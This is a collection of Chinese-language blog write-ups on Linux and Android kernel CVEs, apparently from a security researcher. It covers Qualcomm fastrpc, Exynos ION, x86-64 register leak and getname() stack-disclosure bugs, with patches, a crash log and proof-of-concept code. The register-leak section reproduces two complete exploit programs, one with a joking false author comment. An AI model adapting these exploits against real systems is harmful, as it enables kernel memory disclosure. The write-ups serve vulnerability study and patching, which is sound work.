.signal_id = 1024/*too big*/ }; int ret = ioctl(3,COMPAT_FASTRPC_IOCTL_DSPSIGNAL_WAIT,&amp;arg); // [3] 进程 B 调用 32 位的 `ioctl` 接口（从而设置了 `is_compat` 标志）并退出。 printf(&quot;ioctl returned %d (%m)\\n&quot;, ret); return 0; } Patch 定义了一个enum fastrpc_msg_type，去除了结构体fastrpc_file里的is_compat（把这个flag的“全局”级别降低了）。 既然去除了结构体fastrpc_file里的is_compat，那么在c文件里用到的地方也要去掉。比如下面978行去掉了这个字段的设置，而是通过fastrpc_msg_type来设置。 32 位兼容层的ioctl中，invoke和invoke2分别做了改变：350行的参数从USER_MSG换成了COMPAT_MSG，从上面的注释来看，前者表示64位，后者表示32位；487行给invoke2函数加了一个参数true，来表示是兼容层。 上面兼容层最后会调用64位的函数。 对于invoke：如果是COMPAT_MSG，则kernel设置为USER_MSG，否则是原值。这里的意思是如果是兼容层传过来的，因为在兼容层已经完成了数据类型的转换，所以这里就把类型改过来，直接当64位的了。 3401行调用了context_alloc函数： 对于invoke2：不再用fl-&gt;is_compat，而是用传入的参数is_compat（传入true） 参考文献 https://googleprojectzero.blogspot.com/2024/12/qualcomm-dsp-driver-unexpectedly-excavating-exploit.html https://project-zero.issues.chromium.org/issues/42451710 https://docs.qualcomm.com/product/publicresources/securitybulletin/october-2024-bulletin.html https://git.codelinaro.org/clo/la/platform/vendor/qcom/opensource/dsp-kernel/-/commit/c60ac212aabd299304dfbb54b1fc18c59247d9ae ","link":"https://lzxzl.github.io/post/cve-2024-21455-is_compat-flag-leads-to-access-of-userland-provided-addresses-as-kernel-pointers/"},{"title":"CVE-2024-38402 refcount leak leading to UAF in fastrpc_get_process_gids","content":" qualcomm-dsp-driver: adsprpc 该漏洞是与task相关联的 group_info 结构体的引用计数泄漏导致的UAF。在 fastrpc_get_process_gids 函数中，调用了 get_current_groups，它会增加 group_info 结构体的引用计数，但该引用计数从未被减1。此外，这个引用计数是一个非饱和引用计数（non-saturating refcount），这意味着如果你大约调用 fastrpc_get_process_gids 2^32 次，就有可能发生溢出。 尽管在实际中很难利用这个漏洞（触发这个错误至少需要 14 个小时），但它仍然是一次内存损坏，并可能导致其相关的后果。下面是由该问题引发的示例崩溃日志。日志显示了一个无效内存读错误（Invalid read），读取地址是 0xffffff89572a0000，这是因为 group_info 的内存已经被释放，但仍被访问。 [77306.174599] [7: adbd: 5455] BUG: KFENCE: invalid read in groups_to_user+0x34/0x1a4 [77306.174606] [7: adbd: 5455] Invalid read at 0xffffff89572a0000: &lt;-- uaf 读 [77306.174607] [7: adbd: 5455] groups_to_user+0x34/0x1a4 [77306.174609] [7: adbd: 5455] invoke_syscall+0x58/0x13c [77306.174612] [7: adbd: 5455] el0_svc_common+0xb4/0xf0 [77306.174614] [7: adbd: 5455] do_el0_svc+0x24/0x90 [77306.174615] [7: adbd: 5455] el0_svc+0x20/0x7c [77306.174617] [7: adbd: 5455] el0t_64_sync_handler+0x84/0xe4 [77306.174618] [7: adbd: 5455] el0t_64_sync+0x1b8/0x1bc [77306.174620] [7: adbd: 5455] [77306.174621] [7: adbd: 5455] CPU: 7 PID: 5455 Comm: adbd Tainted: G S W OE 5.15.123-android13-8-28577312-abS911BXXU3CXD3 #1 [77306.174623] [7: adbd: 5455] Hardware name: Samsung DM1Q PROJECT (board-id,13) (DT) [77306.174624] [7: adbd: 5455] pstate: 22400005 (nzCv daif +PAN -UAO +TCO -DIT -SSBS BTYPE=--) [77306.174626] [7: adbd: 5455] pc : groups_to_user+0x34/0x1a4 [77306.174628] [7: adbd: 5455] lr : __arm64_sys_getgroups+0x4c/0x6c [77306.174629] [7: adbd: 5455] sp : ffffffc02a073e00 [77306.174630] [7: adbd: 5455] x29: ffffffc02a073e00 x28: ffffff8868030040 x27: 0000000000000000 [77306.174633] [7: adbd: 5455] x26: 0000000000000000 x25: 0000000000000000 x24: 0000000000000000 [77306.174635] [7: adbd: 5455] x23: 0000000060001000 x22: 00000077219a4f2c x21: ffffff8868030040 [77306.174637] [7: adbd: 5455] x20: ffffffc0081bd46c x19: 000000006b6b6b6b x18: ffffffc016089000 [77306.174638] [7: adbd: 5455] x17: 000000000000fffe x16: b4000074e392f638 x15: ffffff895729fff8 [77306.174640] [7: adbd: 5455] x14: 00000000524e68f8 x13: ffffff8868030040 x12: ffffffc00ad82000 [77306.174641] [7: adbd: 5455] x11: 0000007fffffffff x10: ffffffc00aa93000 x9 : 0000000014939a3e [77306.174643] [7: adbd: 5455] x8 : 000000006b6b6b6b x7 : 0000000000000000 x6 : 0000000000000000 [77306.174645] [7: adbd: 5455] x5 : 0000000000000000 x4 : 0000000000000000 x3 : 0000000000000000 [77306.174646] [7: adbd: 5455] x2 : 0000000000000040 x1 : ffffff8904db9700 x0 : b400007491448d40 [77306.174648] [7: adbd: 5455] Call trace: [77306.174648] [7: adbd: 5455] groups_to_user+0x34/0x1a4 [77306.174650] [7: adbd: 5455] invoke_syscall+0x58/0x13c [77306.174651] [7: adbd: 5455] el0_svc_common+0xb4/0xf0 [77306.174653] [7: adbd: 5455] do_el0_svc+0x24/0x90 [77306.174654] [7: adbd: 5455] el0_svc+0x20/0x7c [77306.174655] [7: adbd: 5455] el0t_64_sync_handler+0x84/0xe4 [77306.174656] [7: adbd: 5455] el0t_64_sync+0x1b8/0x1bc 漏洞代码和patch如下： static int fastrpc_get_process_gids(struct gid_list *gidlist) { - struct group_info *group_info = get_current_groups(); // 只加，但没地方减 + struct group_info *group_info = current_cred()-&gt;group_info; int i = 0, err = 0, num_gids = group_info-&gt;ngroups + 1; unsigned int *gids = NULL; gids = kcalloc(num_gids, sizeof(unsigned int), GFP_KERNEL); if (!gids) { err = -ENOMEM; goto bail; } /* Get the real GID */ gids[0] = __kgid_val(current_gid()); /* Get the supplemental GIDs */ for (i = 1; i &lt; num_gids; i++) gids[i] = __kgid_val(group_info-&gt;gid[i - 1]); sort(gids, num_gids, sizeof(*gids), uint_cmp_func, NULL); gidlist-&gt;gids = gids; gidlist-&gt;gidcount = num_gids; bail: if (err) kfree(gids); return err; } 参考文献 https://googleprojectzero.blogspot.com/2024/12/qualcomm-dsp-driver-unexpectedly-excavating-exploit.html https://project-zero.issues.chromium.org/issues/42451711 https://git.codelinaro.org/clo/la/kernel/msm-5.15 ","link":"https://lzxzl.github.io/post/cve-2024-38402-refcount-leak-leading-to-uaf-in-fastrpc_get_process_gids/"},{"title":"CVE-2021-25458 Kernel NULL Pointer Dereference in Exynos ION Implementation","content":" https://labs.taszk.io/blog/post/60_ss_ion_null_deref/ Exynos ION内核驱动程序中存在一个ION内存缓冲区类型混淆漏洞。该漏洞可能导致将未初始化的内存视为有效指针，并导致内核空指针异常。untrusted app可以利用此漏洞导致内核崩溃。 函数ion_iovmm_map用于将ion缓冲区映射到总线的io地址空间，使其可用于支持dma的外部设备，并返回此dma地址。 但是呢，这个函数里有一个获取dma地址的“快速路径“：如果传入的参数attachment里有buffer，而且这个buffer带值为ION_FLAG_PROTECTED的flag，那么就从这个buffer里取关联的、预初始化的prot-&gt;dma_addr指针。 // drivers/staging/android/ion/ion_exynos.c dma_addr_t ion_iovmm_map(struct dma_buf_attachment *attachment, off_t offset, size_t size, enum dma_data_direction direction, int prop) { struct ion_buffer *buffer = attachment-&gt;dmabuf-&gt;priv; dma_addr_t iova; // 如果这个buffer带了flag ION_FLAG_PROTECTED if (IS_ENABLED(CONFIG_EXYNOS_CONTENT_PATH_PROTECTION) &amp;&amp; (buffer-&gt;flags &amp; ION_FLAG_PROTECTED)) { // 1. 这可能是一个未初始化的指针 struct ion_buffer_prot_info *prot = buffer-&gt;priv_virt; // 2. 对其进行解引用,并返回读取的值 iova = prot-&gt;dma_addr; } else { iova = __ion_iovmm_map(attachment, offset, size, direction, prop); } return iova; } 这种优化是基于这样一种假设：要么ion分配器为受保护的缓冲区初始化buffer的priv_virt指针，要么不允许使用这个标志。这个假设对大多数堆实现来说是正确的，只有所谓的rbin堆除外。从ION_HEAP_TYPE_CUSTOM2堆分配的任何ion缓冲区都使用这个分配器。rbin堆分配器(在drivers/staging/android/ion/ion_rbin_heap.c中的ion_rbin_heap_allocate)只是简单地忽略这个标志，但它从不初始化priv_virt指针。 因此，如果将从rbin堆分配的ion缓冲区传递给ion_iovmm_map函数，它就会使用未初始化的priv_virt指针。尽管ion_iovmm_map没有直接暴露给用户空间，但内核中有不同的驱动程序将用户提供的ion缓冲区传递给这个函数。 原作者已经静态验证了这样的调用链存在于以下设备的内核中： /dev/vertex10: npu_memory_map -&gt; ion_iovmm_map /dev/tsmux: tsmux_ioctl -&gt; tsmux_ioctl_m2m_map_buf -&gt; ion_iovmm_map /dev/g2d /dev/fimg2d: g2d_ioctl -&gt; … -&gt; g2d_get_dmabuf -&gt; ion_iovmm_map /dev/dsp: dsp_ioctl -&gt; … -&gt; dsp_memory_map_buffer -&gt; ion_iovmm_map /dev/m2m1shot_scaler0: m2m1shot_ioctl -&gt; … -&gt; m2m1shot_dma_addr_map -&gt; ion_iovmm_map /dev/jsqz: jsqz_ioctl -&gt; … -&gt; jsqz_dma_addr_map -&gt; ion_iovmm_map ... 虽然对这些设备驱动的访问在不同程度上受到selinux的限制，但它们一起提供了相当大的攻击面。最值得注意的是/dev/dsp。这个节点具有vendor_dsp_device标签，并且暴露给相当多的非特权selinux上下文，包括不受信任的应用程序。/dev/ion设备具有ion_device selinux标签，这是限制最少的selinux类型之一，它也可供不受信任的应用程序使用。 因此，untrusted app可以从rbin堆中分配一个ion缓冲区，并将其传递给/dev/dsp设备。该设备将尝试访问未初始化的内核指针，在这种情况下，这将在内核内部导致空指针解引用，并随后导致内核panic。 总结：三星自己实现的ion_iovmm_map函数里，有两条路径来映射io内存，一个是正常的mmap，另一个fast path直接从参数里取protected buffer。按设计来说，所有ion分配器在分配protected buffer的时候，都要初始化它的priv_virt指针。但是有一个rbin堆分配器没有初始化，导致在ion_iovmm_map函数里取出来之后用的时候发生空指针解引用。 参考文献 https://labs.taszk.io/blog/post/60_ss_ion_null_deref/ ","link":"https://lzxzl.github.io/post/cve-2021-25458-kernel-null-pointer-dereference-in-exynos-ion-implementation/"},{"title":"CVE-2009-2910-Linux Kernel x86-64 Register Leak by Jon Oberheide","content":"Introduction versions &lt;= 2.6.32-rc1 The x86-64 registers r8-r11 may be leaked to 32-bit unprivileged userspace applications that switch themselves into 64-bit mode. x86-64 架构（又称为 amd64）中的 r8 到 r11 寄存器的内容可能会泄露给切换到 64 位模式的 32 位非特权用户空间应用程序。 x86-64 的一个关键设计决策是其与 32 位代码的向后兼容性： 在 x86-64 的长模式下，有两种由代码段描述符控制的子模式：兼容模式和 64 位模式。 因此，64 位操作系统可以毫无问题地执行 32 位和 64 位二进制文件。 当然，如果我们正在执行一个 32 位二进制文件，我们可以访问传统的 32 位架构寄存器，而不是 x86-64 增加的额外寄存器文件。 然而，可以在单个可执行文件中混合使用 32 位和 64 位代码： 一个 32 位进程可以切换到 64 位模式，并直接跳转到 x86-64 机器代码。 一个 64 位进程能够调用 32 位系统调用。 这种模式切换可以被滥用，正如 Chris Evans 发现的那样（因为 32 位和 64 位的系统调用编号不同），绕过系统调用过滤机制（syscall filtering mechanisms），从而实现对敏感信息的泄露。 下面这个漏洞就是在这种情况下被利用的，在 32 位和 64 位代码之间切换时发生信息泄漏。 syscall filtering mechanisms：好吧，其实应该就是系统调用的访问控制 主要目的：限制应用程序可以执行的系统调用类型。 这对于增强系统的安全性至关重要，尤其是在多租户环境、容器化部署或任何需要细粒度安全控制的场景中。 过滤机制可以帮助防止恶意软件或者滥用资源，限制了潜在的攻击面。 实现： seccomp（Secure Computing Mode）：允许进程指定一个简单的过滤器，这个过滤器定义了哪些系统调用是允许的，哪些是被禁止的。这种模式有两个级别： seccomp 模式 1：这是一种较为严格的过滤模式，只允许四个系统调用：read(), write(), _exit(), 和 sigreturn()。这对于非常受限的环境非常有用。 seccomp 模式 2：提供了更灵活的过滤能力，允许进程定义一个过滤器，该过滤器使用 Berkeley Packet Filter（BPF）语法，可以精确地指定允许和禁止的系统调用列表，甚至可以根据调用的参数来决定是否允许。 AppArmor 和 SELinux：这些是更为复杂的安全模块，它们提供了基于角色的访问控制（RBAC）和强制访问控制（MAC）策略，这些策略可以控制进程对系统调用的访问。这些工具通过定义安全策略来限制应用程序可以执行的系统调用，以及它们可以访问的文件和网络资源。 The Vulnerability 从系统调用返回时，未将几个 x86-64 寄存器清零（特别是 r8 到 r11）。一个 32 位应用程序可能能切换到 64 位模式，并访问 r8、r9、r10 和 r11 寄存器，从而泄露它们之前的值。这个问题由[] Jan Beulich 发现](http://lkml.org/lkml/2009/10/1/164)。 修复方法是在系统调用返回时通过执行 XOR 操作将 r8 到 r11 寄存器清零，即 xorq %rx,%rx。这样可以确保这些寄存器的内容在返回到用户空间前不会保留任何敏感信息。 diff --git a/arch/x86/ia32/ia32entry.S b/arch/x86/ia32/ia32entry.S --- a/arch/x86/ia32/ia32entry.S +++ b/arch/x86/ia32/ia32entry.S @@ -172,6 +172,10 @@ sysexit_from_sys_call: movl RIP-R11(%rsp),%edx /* User %eip */ CFI_REGISTER rip,rdx RESTORE_ARGS 1,24,1,1,1,1 + xorq %r8,%r8 + xorq %r9,%r9 + xorq %r10,%r10 + xorq %r11,%r11 popfq CFI_ADJUST_CFA_OFFSET -8 /*CFI_RESTORE rflags*/ The Exploit 核心思想：编写一个32 位用户空间应用程序，同时让他切换到 64 位模式，以便访问 x86-64 寄存器并暴露泄露的信息。 为了将32 位和 64 位代码混合，使用 -m32 编译二进制文件，但使用 gcc 的内联汇编来混合必要的 64 位代码，而不会产生冲突。为了切换到 64 位模式，只需要执行一个带有 USER_CS 代码段（在 Linux 上是 0x33）的 ljmp/lcall： ljmp 指令是长跳转，用于改变控制流同时切换代码段寄存器，这里将代码段寄存器设置为 0x33，即 x86-64 下的用户空间代码段，从而切换到 64 位模式。 .code32 ljmp $0x33, $1f .code64 1: /* 64-bit code here */ xorq %rax, %rax ... 对于 64 位寄存器 r8、r9、r10 和 r11，简单地将 64 位压缩到两个 32 位的通用寄存器中。例如，将 r8 的上下 32 位分别放入 rax 和 rcx（稍后通过 eax 和 ecx 检索） movq %r8, %rcx shr $32, %r8 movq %r8, %rax 最后，为了检索泄露的值，跳转到一个无效地址（0xdeadbeef）引发 SIGSEGV，然后在 gdb 中使用 info regs 来检查寄存器的值。 $ gcc -m32 x86_64-reg-leak.c -o x86_64-reg-leak $ gdb ./x86_64-reg-leak GNU gdb 6.8-debian ... (gdb) run [+] Switching to x86_64 long mode via far jmp... ... Program received signal SIGSEGV, Segmentation fault. 0xdeadbeef in ?? () (gdb) info reg eax 0xffff8800 -30720 &lt;-- r8 上半部 ecx 0xa5cc6000 -1513332736 &lt;-- r8 下半部 edx 0x0 0 &lt;-- r9 上半部 ebx 0x1 1 &lt;-- r9 下半部 esp 0xffff8800 0xffff8800 &lt;-- r10 上半部 ebp 0xa5cc6000 0xa5cc6000 &lt;-- r10 下半部 esi 0x0 0 &lt;-- r11 上半部 edi 0xffffffff -1 &lt;-- r11 下半部 ... Exp1 /* * x86_64-reg-leak.c * * Linux Kernel &lt;= 2.6.32-rc1 x86_64 Register Leak * Jon Oberheide &lt;jon@oberheide.org&gt; * http://jon.oberheide.org * * Information: * * http://lkml.org/lkml/2009/10/1/164 * * While 32-bit processes can't directly access R8...R15, they can gain * access to these registers by temporarily switching themselves into 64-bit * mode. * * Usage: * * $ gcc -m32 x86_64-reg-leak.c -o x86_64-reg-leak * $ gdb ./x86_64-reg-leak * GNU gdb 6.8-debian * ... * (gdb) run * [+] Switching to x86_64 long mode via far jmp... * ... * Program received signal SIGSEGV, Segmentation fault. * 0xdeadbeef in ?? () * (gdb) info reg * eax 0xffff8800 -30720 &lt;-- r8 upper * ecx 0xa5cc6000 -1513332736 &lt;-- r8 lower * edx 0x0 0 &lt;-- r9 upper * ebx 0x1 1 &lt;-- r9 lower * esp 0xffff8800 0xffff8800 &lt;-- r10 upper * ebp 0xa5cc6000 0xa5cc6000 &lt;-- r10 lower * esi 0x0 0 &lt;-- r11 upper * edi 0xffffffff -1 &lt;-- r11 lower * ... * * Notes: * * We switch from x86_64 compat mode to long mode via our far jmp and * then dump out r8-r11 through our 32-bit GPRs and then segfault for * register inspection via GDB. */ #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;stdint.h&gt; #include &lt;string.h&gt; // 定义了用户代码段和数据段的选择子，用于后面在汇编代码中指定 #define USER_CS &quot;0x33&quot; #define USER_DS &quot;0x2b&quot; int main(void) { int ret; printf(&quot;[+] Switching to x86_64 long mode via far jmp...\\n\\n&quot;); // 睡眠 8s 多 for (ret = 5; ret &gt; 0; ret--) { printf(&quot;%d...\\n&quot;, ret); sleep(1); } printf(&quot;\\n&quot;); sleep(3); asm volatile ( &quot; .code32 \\n&quot; // .code32 指示接下来的代码是32位 &quot; ljmp $&quot; USER_CS &quot;, $1f \\n&quot; // ljmp 是远跳转指令，用于切换到64位模式。目标是标签 1f，即代码中的 1: 标签。 &quot; \\n&quot; &quot; .code64 \\n&quot; // .code64 指示接下来的代码是64位 &quot; 1: \\n&quot; &quot; movl $&quot; USER_DS &quot;, %%eax \\n&quot; // 将数据段选择子加载到寄存器 eax，然后设置数据段（ds）、栈段（ss）和附加段（es）寄存器。 &quot; movl %%eax, %%ds \\n&quot; &quot; movl %%eax, %%ss \\n&quot; &quot; movl %%eax, %%es \\n&quot; &quot; \\n&quot; &quot; movq %%r8, %%rcx \\n&quot; // 将 r8 寄存器的内容复制到 rcx &quot; shr $32, %%r8 \\n&quot; // 将 r8 右移32位，把高32位移至低32位位置 &quot; movq %%r8, %%rax \\n&quot; // 将修改后的 r8 复制到 rax &quot; \\n&quot; &quot; movq %%r9, %%rbx \\n&quot; // 这个模式对 r9, r10, r11 也重复执行，分别操作 rbx, rdx, rbp, rsp, rdi, rsi &quot; shr $32, %%r9 \\n&quot; &quot; movq %%r9, %%rdx \\n&quot; &quot; \\n&quot; &quot; movq %%r10, %%rbp \\n&quot; &quot; shr $32, %%r10 \\n&quot; &quot; movq %%r10, %%rsp \\n&quot; &quot; \\n&quot; &quot; movq %%r11, %%rdi \\n&quot; &quot; shr $32, %%r11 \\n&quot; &quot; movq %%r11, %%rsi \\n&quot; &quot; \\n&quot; &quot; .code32 \\n&quot; // 回到32位代码模式 &quot; jmp 0xdeadbeef \\n&quot; // 执行一个跳转到无效地址 0xdeadbeef 的指令，这通常会导致程序异常终止（例如访问违规） :: ); return 0; } 为什么.code32 能指示接下来的代码是32位？ 在汇编语言中，指令 .code32 和 .code64 是由汇编器提供的伪指令（pseudo-instructions），它们用来指定接下来的代码应该按照哪种体系结构（32位或64位）来解释和编译。这些伪指令不直接转换为机器代码，而是用来影响汇编器的行为。下面解释了为什么和如何 .code32 能够指示汇编器编译32位代码： 汇编器的模式控制 汇编器，如 GNU Assembler (GAS)，需要知道汇编代码应该被如何处理：是作为32位代码还是64位代码。这影响了指令的编码、可用的指令集、以及寄存器的名字和功能。 指令长度和格式: 32位和64位模式下，某些指令的编码长度和格式可能不同。例如，64位模式支持更长的地址和偏移量。 可用指令: 64位模式可能支持一些32位模式中不可用的扩展指令，例如操作64位寄存器的指令。 寄存器: 64位模式引入了更多的寄存器和扩展了现有的寄存器（例如，32位的 eax 寄存器在64位中扩展为 rax）。 指示汇编器的目标体系结构 当写入 .code32 或 .code64 时，告诉汇编器接下来的汇编指令应该按照32位或64位体系结构来处理。这是必要的，特别是在编写涉及多种处理模式的代码时（如在操作系统或低级系统软件中常见）。 例如，在代码中： .code32 ljmp $USER_CS, $1f 这里 .code32 告诉汇编器，接下来的 ljmp 指令应该按照32位模式来编译。而 ljmp （远跳转）可能用于从32位模式切换到64位模式（通过设置正确的代码段寄存器）。 exp2 spender 也同时编写了一个exp，内容如下所示。它将循环调用一系列随机的系统调用，并打印泄露的数据，这样就不必使用 gdb。 /* written by Ingo Molnar -- it's true because this comment says the exploit was written by him! */ #include &lt;stdio.h&gt; #include &lt;sys/syscall.h&gt; // 这些变量用于存储从64位寄存器分割为32位部分后的值。 unsigned int _r81; unsigned int _r82; unsigned int _r91; unsigned int _r92; unsigned int _r101; unsigned int _r102; unsigned int _r111; unsigned int _r112; unsigned int _r121; unsigned int _r122; unsigned int _r131; unsigned int _r132; unsigned int _r141; unsigned int _r142; unsigned int _r151; unsigned int _r152; // 通过从32位模式（code32）转换到64位模式（code64）并返回，从64位寄存器中提取值并将它们存储到全局变量中 int leak_it(void) { asm volatile ( &quot;.intel_syntax noprefix\\n&quot; // 指定使用Intel语法进行汇编代码 &quot;.code32\\n&quot; // 表明接下来的汇编代码应被视为32位 &quot;jmp label1\\n&quot; // 跳转到标签label1，这是第一个远调用序列的开始 &quot;farcalllabel1:\\n&quot; // 用于处理从32位到64位的远调用 &quot;.code64\\n&quot; // 切换到64位模式 &quot;mov eax, r8d\\n&quot; // 这些指令将64位寄存器的低32位移动到32位寄存器（eax、ebx等），然后将高32位移动到寄存器的低半部分以读取它们 &quot;shr r8, 32\\n&quot; &quot;mov ebx, r8d\\n&quot; &quot;mov ecx, r9d\\n&quot; &quot;shr r9, 32\\n&quot; &quot;mov edx, r9d\\n&quot; &quot;mov esi, r10d\\n&quot; &quot;shr r10, 32\\n&quot; &quot;mov edi, r10d\\n&quot; &quot;.att_syntax noprefix\\n&quot; // 转换为AT&amp;T语法，通常在GNU汇编器中使用。这里用于切换回AT&amp;T语法进行长返回（lret）指令，该指令用于从调用返回 &quot;lret\\n&quot; &quot;.intel_syntax noprefix\\n&quot; &quot;farcalllabel2:\\n&quot; &quot;mov eax, r11d\\n&quot; &quot;shr r11, 32\\n&quot; &quot;mov ebx, r11d\\n&quot; &quot;mov ecx, r12d\\n&quot; &quot;shr r12, 32\\n&quot; &quot;mov edx, r12d\\n&quot; &quot;mov esi, r13d\\n&quot; &quot;shr r13, 32\\n&quot; &quot;mov edi, r13d\\n&quot; &quot;.att_syntax noprefix\\n&quot; &quot;lret\\n&quot; &quot;.intel_syntax noprefix\\n&quot; &quot;farcalllabel3:\\n&quot; &quot;mov eax, r14d\\n&quot; &quot;shr r14, 32\\n&quot; &quot;mov ebx, r14d\\n&quot; &quot;mov ecx, r15d\\n&quot; &quot;shr r15, 32\\n&quot; &quot;mov edx, r15d\\n&quot; &quot;.att_syntax noprefix\\n&quot; &quot;lret\\n&quot; &quot;.intel_syntax noprefix\\n&quot; &quot;.code32\\n&quot; &quot;label1:\\n&quot; &quot;.att_syntax noprefix\\n&quot; &quot;lcall $0x33, $farcalllabel1\\n&quot; &quot;.intel_syntax noprefix\\n&quot; &quot;mov _r81, eax\\n&quot; &quot;mov _r82, ebx\\n&quot; &quot;mov _r91, ecx\\n&quot; &quot;mov _r92, edx\\n&quot; &quot;mov _r101, esi\\n&quot; &quot;mov _r102, edi\\n&quot; &quot;.att_syntax noprefix\\n&quot; &quot;lcall $0x33, $farcalllabel2\\n&quot; &quot;.intel_syntax noprefix\\n&quot; &quot;mov _r111, eax\\n&quot; &quot;mov _r112, ebx\\n&quot; &quot;mov _r121, ecx\\n&quot; &quot;mov _r122, edx\\n&quot; &quot;mov _r131, esi\\n&quot; &quot;mov _r132, edi\\n&quot; &quot;.att_syntax noprefix\\n&quot; &quot;lcall $0x33, $farcalllabel3\\n&quot; &quot;.intel_syntax noprefix\\n&quot; &quot;mov _r141, eax\\n&quot; &quot;mov _r142, ebx\\n&quot; &quot;mov _r151, ecx\\n&quot; &quot;mov _r152, edx\\n&quot; &quot;.att_syntax noprefix\\n&quot; ); printf(&quot; R8=%08x%08x\\n&quot;, _r82, _r81); printf(&quot; R9=%08x%08x\\n&quot;, _r92, _r91); printf(&quot;R10=%08x%08x\\n&quot;, _r102, _r101); printf(&quot;R11=%08x%08x\\n&quot;, _r112, _r111); printf(&quot;R12=%08x%08x\\n&quot;, _r122, _r121); printf(&quot;R13=%08x%08x\\n&quot;, _r132, _r131); printf(&quot;R14=%08x%08x\\n&quot;, _r142, _r141); printf(&quot;R15=%08x%08x\\n&quot;, _r152, _r151); return 0; } /* ripped from jon oberheide */ const int randcalls[] = { __NR_read, __NR_write, __NR_open, __NR_close, __NR_stat, __NR_lstat, __NR_lseek, __NR_rt_sigaction, __NR_rt_sigprocmask, __NR_ioctl, __NR_access, __NR_pipe, __NR_sched_yield, __NR_mremap, __NR_dup, __NR_dup2, __NR_getitimer, __NR_setitimer, __NR_getpid, __NR_fcntl, __NR_flock, __NR_getdents, __NR_getcwd, __NR_gettimeofday, __NR_getrlimit, __NR_getuid, __NR_getgid, __NR_geteuid, __NR_getegid, __NR_getppid, __NR_getpgrp, __NR_getgroups, __NR_getresuid, __NR_getresgid, __NR_getpgid, __NR_getsid,__NR_getpriority, __NR_sched_getparam, __NR_sched_get_priority_max }; int main(void) { /* to keep random stack values from being used for pointers in syscalls */ char buf[64] = {}; int call; for (call = 0; call &lt; sizeof(randcalls)/sizeof(randcalls[0]); call++) { syscall(randcalls[call]); leak_it(); } } 指令集和语法转换 .intel_syntax noprefix 这指令改变汇编器解析汇编指令的语法，将其从默认的AT&amp;T语法改为Intel语法。Intel语法是在许多文档和教程中常用的，因为其更加直观。此外，noprefix选项意味着寄存器名称前不需要加%前缀。 .code32 这条指令告诉汇编器接下来的代码是32位代码。在32位模式下，CPU的寄存器和操作默认为32位宽。 jmp label1 这是一个简单的跳转指令，跳转到标签label1处的代码继续执行。这种方式通常用于控制流程，跳过或延迟执行某些代码块。 32位到64位的转换 farcalllabel1: 这是一个标签，用作远程调用的目标点。在这里，代码从32位转换到64位执行。 .code64 这条指令切换到64位模式，允许汇编代码直接访问和操作64位寄存器。 mov eax, r8d 这条指令将64位寄存器R8的低32位移动到32位寄存器EAX。这里的r8d是R8的32位表示。 shr r8, 32 这条指令将R8寄存器中的内容向右移动32位，这样原本的高32位现在成为了低32位。 mov ebx, r8d 将新的R8的低32位（原高32位）移动到EBX寄存器中。 返回到32位代码 .att_syntax noprefix 汇编代码再次更改语法，这次从Intel语法切换回AT&amp;T语法。这是因为某些平台或工具链默认使用AT&amp;T语法，或者为了与之前的汇编代码保持一致。 lret 这是一个远程返回指令，用于从一个远程调用（far call）返回。在这里，它标志着从64位代码返回到32位代码的结束。 The Fix 如上所示。 References https://jon.oberheide.org/blog/2009/10/04/linux-kernel-x86-64-register-leak/ ","link":"https://lzxzl.github.io/post/cve-2009-2910-linux-kernel-x86-64-register-leak-by-jon-oberheide/"},{"title":"CVE-2009-3001 — Linux Kernel getname() Stack Memory Disclosures by Jon Oberheide","content":"The Vulnerability getname()函数是内核中地址族的一个功能，用于检索有关给定套接字的信息。这些信息以sockaddr结构体的形式存在，可以通过getsockname(2)和getpeername(2)系统调用分别从用户空间访问绑定和连接的套接字。 一个典型的getname()函数的操作如下：在栈上的一个sockaddr结构体被填充内部套接字结构的地址信息，然后通过memcpy()函数复制到目的地sockaddr中，此后将其复制回用户空间。例如，以下是在net/irda/af_irda.c中irda地址族的getname()函数： static int irda_getname(struct socket *sock, struct sockaddr *uaddr, int *uaddr_len, int peer) { struct sockaddr_irda saddr; struct sock *sk = sock-&gt;sk; struct irda_sock *self = irda_sk(sk); // 填充saddr中的几个成员，这是一个sockaddr_irda结构体 if (peer) { if (sk-&gt;sk_state != TCP_ESTABLISHED) return -ENOTCONN; saddr.sir_family = AF_IRDA; saddr.sir_lsap_sel = self-&gt;dtsap_sel; saddr.sir_addr = self-&gt;daddr; } else { saddr.sir_family = AF_IRDA; saddr.sir_lsap_sel = self-&gt;stsap_sel; saddr.sir_addr = self-&gt;saddr; } IRDA_DEBUG(1, &quot;%s(), tsap_sel = %#x\\n&quot;, __func__, saddr.sir_lsap_sel); IRDA_DEBUG(1, &quot;%s(), addr = %08x\\n&quot;, __func__, saddr.sir_addr); /* uaddr_len come to us uninitialised */ *uaddr_len = sizeof (struct sockaddr_irda); memcpy(uaddr, &amp;saddr, *uaddr_len); // 通过`memcpy()`函数复制到目的地`sockaddr`中，后面再把uaddr的内容复制到用户空间 return 0; } 查看在include/linux/irda.h中sockaddr_irda结构体的定义： struct sockaddr_irda { sa_family_t sir_family; /* AF_IRDA 2Byte*/ __u8 sir_lsap_sel; /* LSAP selector 1Byte*/ __u32 sir_addr; /* Device address 4Byte */ char sir_name[25]; /* 通常为 &lt;service&gt;:IrDA:TinyTP 25Byte*/ }; 这个结构体总大小为36字节，包括一个较大的25字节sir_name成员。注意，在上述irda_getname()函数中sir_name成员没有被memset()或初始化。**这意味着我们最终的memcpy()将会从栈上复制未初始化的数据，然后返回给用户空间，可能泄露敏感信息。**除了25字节的sir_name，编译器还在sir_lsap_sel和sir_addr之间为了对齐目的插入了一个字节的填充，以及在sir_name后还有3字节的填充。这导致总共有29字节的未初始化的内核栈内存被泄漏到用户空间。 事实证明，这个问题不仅限于irda，还包括can、appletalk、rose、netrom、econet和llc地址族。这些漏洞影响Linux 2.6内核在2.6.31-rc7之前的版本。虽然这些套接字家族不是最常见的，但它们作为模块随通用发行版自动加载，当创建套接字时通过request_module(&quot;net-pf-X&quot;)调用。这是另一个理由说明为什么你应该从你的内核配置中剔除未使用和可能存在漏洞的代码，或使用像grsecurity的MODHARDEN这样的工具来减少你的攻击面。 小结 当看到未初始化的局部变量结构体时就要敏感了，如果只设置其部分内容，然后进行拷贝和传到用户空间的操作，就会发生信息泄漏！ The Exploit 利用这个内存泄露漏洞非常直接和简单，可以由非特权用户执行。对于 irda，我们只需要创建一个 AF_IRDA 套接字，然后对其调用 getsockname(2)。利用其他一些易受攻击的地址族可能需要绑定或连接套接字以满足 getname() 函数中的某些条件。但对于 irda，所需的代码很简单： struct sockaddr_irda saddr; int sock, len = sizeof(saddr); sock = 